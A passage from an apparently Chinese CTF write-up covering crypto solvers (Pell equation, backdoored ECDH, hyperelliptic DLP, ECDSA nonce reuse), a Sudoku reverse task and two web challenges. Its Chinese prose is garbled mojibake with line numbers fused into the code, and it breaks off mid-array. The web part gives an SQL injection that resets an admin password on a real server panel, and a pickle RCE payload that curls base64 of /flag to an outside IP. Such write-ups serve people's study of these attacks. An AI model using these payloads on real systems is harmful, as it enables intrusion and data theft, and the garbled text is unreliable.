b&#x27;flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;&#x27; â€‹ CRYPTOcheckin æ¥ç­¾åˆ°å§ 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import *from secret import flag, x, ydef keygen(nbit): p, q = [getPrime(nbit) for _ in range(2)] return (p, q)p, q = keygen(1024)n = p * qt = len(flag)//2part1 = bytes_to_long(flag[:t])part2 = bytes_to_long(flag[t:])D = 1117x = y = assert x**2 - D * y**2 == 1enc1 = pow(233 * n ** 2 + 1, part1, n ** 3)enc2 = pow(y * n + 1, part2, n ** 3)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;enc1 = &#123;enc1&#125;&#x27;)print(f&#x27;enc2 = &#123;enc2&#125;&#x27;)&#x27;&#x27;&#x27;n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101&#x27;&#x27;&#x27; PELLæ–¹ç¨‹æ±‚è§£+äºŒé¡¹å¼å®šç†åº”ç”¨ã€‚ 12345678910111213141516171819202122n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, NoneN = 1117x, y = solve_pell(N)flag1 = (enc1 - 1) // n**2 * inverse_mod(233, n) % nflag2 = (enc2 % n**2 - 1) // n * inverse_mod(y, n) % nprint(bytes.fromhex(hex(flag1)[2:])+bytes.fromhex(hex(flag2)[2:]))# b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27; â€‹ backdoor 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from Crypto.Util.number import *from Crypto.Util.Padding import padfrom random import randintfrom Crypto.Util.strxor import strxorfrom Crypto.Cipher import AESfrom hashlib import sha256from hashlib import md5flag = b&#x27;xxx&#x27;def Get_Parameters(): w = getPrime(25) a = getPrime(15) b = getPrime(15) x = getPrime(30) return w,a,b,xdef Malicious_ECDH(): w,a,b,x = Get_Parameters() P = getPrime(512) A = getRandomNBitInteger(30) B = getRandomNBitInteger(40) F = GF(P) E = EllipticCurve(F, [A, B]) G = E.random_point() k1 = getRandomNBitInteger(50) M1 = k1 * G Y = x * G t = randint(0,1) t = 1 z = (k1 - w * t) * G + (-a*k1 - b) * Y k2 = sha256(str(z[0]).encode()).digest()[:6] k2 = bytes_to_long(k2) M2 = k2 * G k_rec = getRandomNBitInteger(50) B_ = k_rec * G shared_key1 = k_rec * M2 shared_key2 = k2 * B_ assert shared_key1 == shared_key2 print((w,a,b,x)) print((A,B,P)) print(G.xy()) print(M1.xy()) print(M2.xy()) print(B_.xy()) return shared_key1def easy_enc(pt,key): key = md5(str(int(key[0])).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ct = cipher.encrypt(pad(pt,16)) print(ct) key = Malicious_ECDH()easy_enc(flag,key) $z = (k_1 - wt) G + (-ak_1 - b)Y=k_1G-wtG+(-ak_1Y-bY)=M_1-wtG-axM_1-bxG$ åˆ $key2=k_2B$ï¼Œæ±‚è§£å¾—åˆ°å…±äº«keyï¼Œè§£AESå³å¯ã€‚ 12345678910111213141516171819202122w, a, b, x = (31889563, 31153, 28517, 763220531)A, B, P = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527)G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770)M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921)M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462)B = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370)enc = b&#x27;\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2&#x27;E = EllipticCurve(GF(P), [A, B])G, M1, M2, B = [E(_) for _ in [G, M1, M2, _B]]t = 1z = M1 - w*t* G - a*x*M1 - b*x*Gk2 = sha256(str(z[0]).encode()).digest()[:6]k2 = bytes_to_long(k2)key = k2 * _Bkey = md5(str(int(key[0])).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(enc)print(flag)# flag&#123;63259ab8-4916-4095-8888-d92c2b003e18&#125; â€‹ magic_dlp ez hyperelliptic curve problem 123456789101112131415161718192021222324252627282930313233from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom hashlib import sha256from base64 import b64encodefrom secret import flagp = random_prime(2 ^ 256) sx = randint(1, p-1) g = 3 PR.&lt;x&gt; = PolynomialRing(GF(p)) f = sum(randint(0, 2^128)*x**i for i in range(2*g + 1 + 1)) sy = f(sx).nth_root(2) HC = HyperellipticCurve(f, 0) J = HC.jacobian()(GF(p)) r = randint(0, 2^40) D1 = randint(1, p-1)*J(HC((sx, sy))) D2 = r*D1 key = sha256(str(r).encode()).digest() aes = AES.new(key, AES.MODE_ECB) ct = aes.encrypt(pad(flag, 16)) print(p) print(D1) print(D2) print(b64encode(ct).decode()) &quot;&quot;&quot;28250322002421485740011517298787354630342182411922678481506757706584776470549(x^3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565*x^2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229*x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773*x^2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914*x + 9020351128638199743425310619576234999021949822922952447017982687315971687269)(x^3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159*x^2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433*x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167*x^2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199*x + 24006419269594097580414614133924457311337109216133817568627246946606650903690)IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;&quot;&quot; è¶…æ¤­åœ†æ›²çº¿ä¸‹çš„DLPé—®é¢˜ã€‚ é¦–å…ˆæ¢å¤ $f$ï¼Œå‚è€ƒ https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell å¯ç”¨CRTå¾—åˆ° $f$ï¼Œç‚¹æ•°ä¸è¶³å¤Ÿä½¿å¾—ä¸è¶³ä»¥æ¢å¤æ­£å¸¸çš„ $f$ã€‚ æ³¨æ„åˆ° $p$ ä¸º 256ä½ï¼Œè€Œ $f$ çš„ç³»æ•°çš†ä¸º 128ä½ï¼Œå¯ä»¥ç”¨ç±»ä¼¼RLWEçš„æ–¹æ³•LLLç®—å‡º $f$ï¼Œæœ€åï¼Œ$r$ ä¸åˆ° 40ä½ï¼Œå¯ä»¥ç”¨BSGSç®—æ³•æ±‚è§£DLPé—®é¢˜ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadfrom hashlib import sha256from base64 import b64decodefrom tqdm import tqdmp = 28250322002421485740011517298787354630342182411922678481506757706584776470549PR = GF(p)[&quot;x&quot;]x = PR.gen()y = 0D1 = ( x ^ 3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565 * x ^ 2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229 * x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773 * x ^ 2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914 * x + 9020351128638199743425310619576234999021949822922952447017982687315971687269,)D2 = ( x ^ 3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159 * x ^ 2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433 * x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167 * x ^ 2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199 * x + 24006419269594097580414614133924457311337109216133817568627246946606650903690,)ct = b64decode(&quot;IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;)rems = [D1[1] ^ 2, D2[1] ^ 2]mods = [D1[0], D2[0]]ff = crt(rems, mods)L = prod(mods)print(ff)M = matrix( ZZ, [ vector(ff.padded_list(8)), vector(L.padded_list(8)), vector((L * x).padded_list(8)), *list(matrix.identity(8) * p), ],)M = M.augment(vector([1] + [0] * (2 + 8)))M[:, -1] *= 2**128M = M.LLL()M[:, -1] /= 2**128target = next(row for row in M if row[-1] == 1 or row[-1] == -1)if target[-1] == -1: target = -targetf = PR(list(target[:-1]))print(f)HC = HyperellipticCurve(f, 0)J = HC.jacobian()(GF(p))D1 = J(D1)D2 = J(D2)# BSGS# D2=(v+u*M)D1# D2-vD1=u*M*D1M = 2**20lhs = &#123;&#125;T = D2for v in tqdm(range(M)): lhs[T] = v T = T - D1MD1 = M * D1T = 0 * MD1for u in tqdm(range(M)): if T in lhs: v = lhs[T] r = u * M + v print(r) break T = T + MD1key = sha256(str(r).encode()).digest()aes = AES.new(key, AES.MODE_ECB)pt = unpad(aes.decrypt(ct), 16)print(pt)# flag&#123;72825d3f-74f0-0a0e-ba1c-895eee99dc29&#125; â€‹ Cisticola Let me tell you a story about polynomial. 123456789101112131415161718192021222324252627Q = [...]# -*- #!/usr/bin/env sage# Problem by rec, with nothing.import Qimport secretimport osimport randomfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padkey = os.urandom(16)cipher = AES.new(key=key, iv=bytes(range(16)), mode=AES.MODE_CBC)enc = cipher.encrypt(pad(secret.flag, 16)).hex()print(f&quot;&#123;enc = &#125;&quot;)p = 1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599R.&lt;x&gt; = PolynomialRing(GF(p))Q = R(Q.Q)t = 17pos = random.sample(range(600), t) + [600]poly = [int(os.urandom(16).hex(), 16) for _ in range(t)] + [int(key.hex(), 16)]hint = 0for i in range(t+1): hint = (hint + poly[i]*x^pos[i]) % Qprint(f&quot;&#123;pos = &#125;\\n&#123;hint = &#125;&quot;) å¤šé¡¹å¼ä¸Šçš„æ¨¡è¿ç®—ï¼Œå…ˆç”¨sageæ¨å¯¼å¤šé¡¹å¼ï¼š 1234567891011121314pos = [477, 491, 210, 515, 150, 142, 561, 5, 475, 329, 598, 274, 241, 310, 108, 483, 181, 600]Q = [...]p = 1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599R = PolynomialRing(GF(p), &#x27;a&#x27;, 19)a = R.gens()x = a[18]#Q = R(Q)Q = ...poly = 0for i in range(18): poly = (poly + a[i]*x^pos[i]) % Q print(poly) å¾—åˆ°429æ¬¡å¤šé¡¹å¼ï¼Œå°†åŒæ¬¡é¡¹çš„ç³»æ•°å½’ç±»ï¼Œå½¢æˆA/BçŸ©é˜µï¼š 1234567891011121314151617181920212223242526f = eval(open(r&#x27;outA.txt&#x27;).readlines()[0])print(len(f))d = []for i in range(430): d.append([])for k in f: x = k[0].strip() d[k[1]].append(int(x.split(&#x27;*&#x27;)[0]) if x[0] != &#x27;a&#x27; else 1)print([len(k) for k in d])# len=8: a0/1/3/6/8/10/15/17# len=9: a0/1/3/6/8/10/15/17+another oneA = d[-8:][::-1]f = eval(open(r&#x27;outB.txt&#x27;).readlines()[0])B = []for k in f: B.append(k[0])g = open(r&#x27;out_final.txt&#x27;,&#x27;w&#x27;)print(f&#x27;A = &#123;A&#125;&#x27;,file=g)print(f&#x27;B = &#123;B[:8]&#125;&#x27;,file=g) å‘ç°å¤§éƒ¨åˆ†å«8é¡¹çš„ç³»æ•°éƒ½ä¸a0/a1/a3/a6/a8/a10/a15/a17å˜é‡æœ‰å…³ï¼Œé€‰å–8ç»„åŒæ¬¡é¡¹ä¸ç»“æœæ¥åšç³»æ•°å¯¹æ¯”ï¼Œæ±‚è§£çŸ©é˜µæ–¹ç¨‹ï¼š 12345678910p = 1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599A = []B = []A = matrix(Zmod(p), A)B = vector(Zmod(p), B[:8])A \\ B# (232766905492121523584723111736297361759, 328061273411433237903912759338260875197, 64156810189296343079030126884552967921, 145155918563801313155466268136086691055, 281912772467581204740174686468688405760, 127909413131477378514965968460479471790, 176132068091173488530894527009633409599, 275609957223526193497841020687316070508) å¾—åˆ°key=a17=275609957223526193497841020687316070508ï¼Œè§£AESï¼š 12345678910from Crypto.Util.number import *from Crypto.Cipher import AESenc = &#x27;e086deeb9f060c014867c5adbd1ee1b449193b6e6177f58a36948282e1728f3b529b2def3c39f69c7a9001b4cac4d1d5&#x27;key = long_to_bytes(275609957223526193497841020687316070508)cipher = AES.new(key=key, iv=bytes(range(16)), mode=AES.MODE_CBC)m = cipher.decrypt(bytes.fromhex(enc))print(m)# b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\\x06\\x06\\x06\\x06\\x06\\x06&#x27; â€‹ ecdsa Let me tell you a story about ecdsa. 1234567891011121314151617181920212223242526import osimport ecdsaimport hashlibfrom Crypto.Util.number import *from Crypto.Util.strxor import strxor as xorimport secretp = getPrime(256)gen = lambda: p + getPrime(16)pad = lambda m: m + os.urandom(32 - len(m) % 32)key = os.urandom(30)sk = ecdsa.SigningKey.from_secret_exponent( secexp=bytes_to_long(key), curve=ecdsa.SECP256k1)sig1 = sk.sign(data=b&#x27;This is the first message.&#x27;, k=gen()).hex()sig2 = sk.sign(data=b&#x27;Here is another message.&#x27;, k=gen()).hex()enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).hex()print(f&quot;&#123;sig1 = &#125;\\n&#123;sig2 = &#125;\\n&#123;enc = &#125;&quot;)&#x27;&#x27;&#x27;sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;&#x27;&#x27;&#x27; é€‰å–æ ‡å‡†æ›²çº¿SECP256k1ï¼Œä¸”æŸ¥çœ‹ecdsaåŒ…æºç ï¼Œsig=r_str+s_strã€‚ æ ¹æ®å¼å­ï¼š $s_1 \\equiv k_1^{-1}(z_1+r_1d) \\pmod n,s_2 \\equiv k_2^{-1}(z_2+r_2d) \\pmod n$ å·²çŸ¥ $r_1,s_1,r_2,s_2,z_1,z_2$ï¼Œä¸” $k_1-k_2=\\Delta k$ å¾ˆå°ï¼Œè”ç«‹ç”¨ $\\Delta k$ è¡¨ç¤º $d$ï¼Œå†åˆ†åˆ«çˆ†ç ´ $\\Delta k$ å€¼å³å¯å¾—åˆ°æ­£ç¡®çš„ $d$ã€‚ 12345678910111213141516171819202122232425262728from hashlib import sha1,sha512p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141h1 = int(sha1(b&#x27;This is the first message.&#x27;).hexdigest(), 16)h2 = int(sha1(b&#x27;Here is another message.&#x27;).hexdigest(), 16)sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;def inv(x): return inverse_mod(x,n)r1 = int(sig1[:64], 16)s1 = int(sig1[64:], 16)r2 = int(sig2[:64], 16)s2 = int(sig2[64:], 16)for dk in range(-2^16, 2^16): x = (dk-(inv(s2)*h2-inv(s1)*h1))*inv(inv(s2)*r2-inv(s1)*r1)%n if x.nbits()&lt;=30*8: print(dk,x) flag = int(sha512(bytes.fromhex(hex(x)[2:])).hexdigest(), 16) ^^ int(enc,16) print(bytes.fromhex(hex(flag)[2:])) # -12538 529916052714421365211802626556164022962456609322782019794355446252399179# b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\\xed\\x98\\x98\\xbc\\x92+\\xc7\\x7f\\xe2_\\xfd\\x17\\x1e\\x9c\\xf7\\x17Rq\\xfa3\\xa2&#123;&#x27; â€‹ WEBphpstudyNKCTF 2023 - xiaopi åŸé¢˜ï¼Œå‚è€ƒ https://blog.csdn.net/weixin_52365980/article/details/129803385ã€‚ åœ¨è¯·æ±‚å¤´åŠ  X-Requested-With: XMLHttpRequest å¯ä»¥è¿›å…¥åå°ç™»å½•ç•Œé¢ï¼Œ å†å‚è€ƒå°çš®é¢æ¿å‰å°sqlæ³¨å…¥æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œæ„é€ payloadï¼š admin&#39;;UPDATE ADMINS set PASSWORD = &#39;202cb962ac59075b964b07152d234b70&#39;;-- æ¥ç€ç”¨ admin/123 å¯è¿›å…¥åå°ï¼Œåœ¨è®¡åˆ’ä»»åŠ¡ç•Œé¢ç›´æ¥RCEå³å¯è·å–flagã€‚ â€‹ easypyæ‰«æå¾—åˆ°ç›®å½• /downloadï¼Œè®¿é—®ä¸‹è½½ www.zipï¼Œé‡Œé¢çœŸæ­£çš„ä»£ç åœ¨ app.cpython-38.pycï¼Œåç¼–è¯‘ï¼š 1234567891011121314151617181920212223242526272829303132333435363738# Source Generated with Decompyle++# File: app.cpython-38.pyc (Python 3.8)import numpyimport base64from flask import Flask, Response, requestapp = Flask(__name__)def index(): return &#x27;å°pæƒ³è¦æ‰¾ä¸€ä¸ªå¥³æœ‹å‹ï¼Œä½ èƒ½å¸®ä»–æ‰¾æ‰¾çœ‹ä¹ˆï¼Ÿ&#x27;index = app.route(&#x27;/&#x27;, [ &#x27;GET&#x27;, &#x27;POST&#x27;], **(&#x27;methods&#x27;,))(index)def girlfriends(): if request.values.get(&#x27;data&#x27;): data = request.values.get(&#x27;data&#x27;) numpydata = base64.b64decode(data) if b&#x27;R&#x27; in numpydata and b&#x27;bash&#x27; in numpydata or b&#x27;sh&#x27; in numpydata: return &#x27;ä¸èƒ½èµ°æ·å¾„å•Š&#x27; resp = None.loads(numpydata) return &#x27;å¯ä»¥çš„ï¼Œè¦çš„å°±æ˜¯ä¸€ç§æ„Ÿè§‰&#x27;girlfriends = app.route(&#x27;/girlfriends&#x27;, [ &#x27;GET&#x27;, &#x27;POST&#x27;], **(&#x27;methods&#x27;,))(girlfriends)def download(): pass# WARNING: Decompyle incompletedownload = app.route(&#x27;/download&#x27;, [ &#x27;GET&#x27;, &#x27;POST&#x27;], **(&#x27;methods&#x27;,))(download)if __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, 80, **(&#x27;host&#x27;, &#x27;port&#x27;)) è§‚å¯Ÿåˆ°è·¯ç”± /girlfriends?data=ï¼Œéœ€æä¾›opcodeæ¥RCEï¼Œä½†ä¸èƒ½åŒ…å« R å­—ç¬¦ï¼Œå‚è€ƒæ–‡ç« ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ i æˆ– o å­—ç¬¦å®ç°RCEï¼Œè€Œç¦ç”¨äº† shï¼Œä¸å¥½å®ç°åå¼¹shellï¼Œç”¨curlå‘½ä»¤å¤–å¸¦flagå€¼åˆ°vpså³å¯ï¼š vpsï¼špython3 -m http.server 10010 payloadï¼š 1234b&#x27;&#x27;&#x27;(S&#x27;curl http://120.25.104.209:10010?`base64 /flag`&#x27;iossystem.&#x27;&#x27;&#x27; å¯¹åº”base64ï¼šKFMnY3VybCBodHRwOi8vMTIwLjI1LjEwNC4yMDk6MTAwMTA/YGJhc2U2NCAvZmxhZ2AnCmlvcwpzeXN0ZW0KLg==ã€‚ â€‹ REVERSEsum æ•°å­—æ¸¸æˆï¼ çœ‹åç¼–è¯‘ä»£ç ç›²çŒœä¸ºæ•°ç‹¬æ¸¸æˆï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°ç‹¬çŸ©é˜µè¿›è¡Œæ±‚è§£ï¼Œå¹¶è¾“å‡ºè§£å¯†åçš„flagåœ¨æ¯ä¸€æ¬¡å¾ªç¯ä¸­ï¼Œè¯»å–ç©å®¶è¾“å…¥çš„æ•°ç‹¬çŸ©é˜µå¹¶å¯»æ‰¾ç©ºç€çš„ä½ç½®ï¼Œæ¥æ”¶åˆ°ä¸€ä¸ªè¾“å…¥æ•°å­—åï¼Œåˆ¤æ–­å…¶æ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åˆ™å¡«å……è¿›çŸ©é˜µä¸­ï¼Œå¹¶å¯¹å…¶æ±‚å’Œã€‚å¦‚æœæ±‚è§£æˆåŠŸï¼Œåˆ™è¾“å‡ºflagã€‚ ä½¿ç”¨åœ¨çº¿æ•°ç‹¬æ±‚è§£å™¨ï¼Œå°†å¡«å…¥æ•°å­—è¿æˆå­—ç¬¦ä¸² 468912723481342575971422657913948591537428763345261è¾“å…¥å¾—åˆ°flagï¼šflag&#123;bbcbff5c1f1ded46c25d28119a85c6c2&#125;ã€‚ â€‹ BWBA ä¸€ä½85å²è€å¤§çˆ·äºä»Šå¹´è€ƒå…¥å¤§å­¦çš„è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ä¸“ä¸šï¼Œåœ¨ç¬¬ä¸€å¹´çš„å­¦ä¹ ä¸­å­¦åˆ°äº†é«˜ç­‰æ•°å­¦ã€ç¦»æ•£æ•°å­¦ã€C++ç­‰ï¼Œä¸‹é¢æ˜¯å¤§çˆ·ç¼–å†™çš„ä¸€é“ç¨‹åºï¼Œè¯·ç ´è§£å¤§çˆ·å†™çš„ç¨‹åº encrypt() åŠ å¯†å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334__int64 __fastcall encrypt(__int64 a1, __int64 a2)&#123; double *v2; // rax double *v3; // rax double v5; // [rsp+8h] [rbp-38h] double v6; // [rsp+8h] [rbp-38h] double v7; // [rsp+8h] [rbp-38h] char v8; // [rsp+23h] [rbp-1Dh] BYREF int v9; // [rsp+24h] [rbp-1Ch] int j; // [rsp+28h] [rbp-18h] int i; // [rsp+2Ch] [rbp-14h] v9 = std::vector&lt;int&gt;::size(a2); std::allocator&lt;double&gt;::allocator(&amp;v8); std::vector&lt;double&gt;::vector&lt;int&gt;(a1, v9, 0LL, &amp;v8); std::allocator&lt;double&gt;::~allocator(&amp;v8); for ( i = 0; i &lt; v9; ++i ) &#123; for ( j = 0; j &lt; v9; ++j ) &#123; v5 = *std::vector&lt;int&gt;::operator[](a2, j); v6 = cos((j + 0.5) * (3.141592653589793 * i) / v9) * v5; v2 = std::vector&lt;double&gt;::operator[](a1, i); *v2 = *v2 + v6; &#125; if ( i ) v7 = sqrt(2.0 / v9); else v7 = sqrt(1.0 / v9); v3 = std::vector&lt;double&gt;::operator[](a1, i); *v3 = *v3 * v7; &#125; return a1;&#125; è¯†åˆ«ä»£ç é€»è¾‘ä¸ºç¦»æ•£ä½™å¼¦å˜æ¢(DCT)ç®—æ³•ï¼Œå†™ä¸€ä¸ªé€†ç®—æ³•è§£å¯†ï¼š 123456789101112131415161718192021222324import numpy as npc = &quot;370.75 234.362 -58.0834 59.8212 88.8221 -30.2406 21.8316 49.9781 -33.5259 2.69675 43.5386 -30.2925 -28.0754 27.593 -2.53962 -27.1883 -5.60777 -0.263937 6.80326 8.03022 -6.34681 -0.89506 -6.80685 -13.6088 27.0958 29.8439 -21.7688 -20.6925 -13.2155 -37.0994 2.23679 37.6699 -3.5 9.85188 57.2806 13.5715 -20.7184 8.6816 3.59369 -4.5302 4.22203 -28.8166 -23.695 31.2268 6.58823 -39.9966 -20.7877 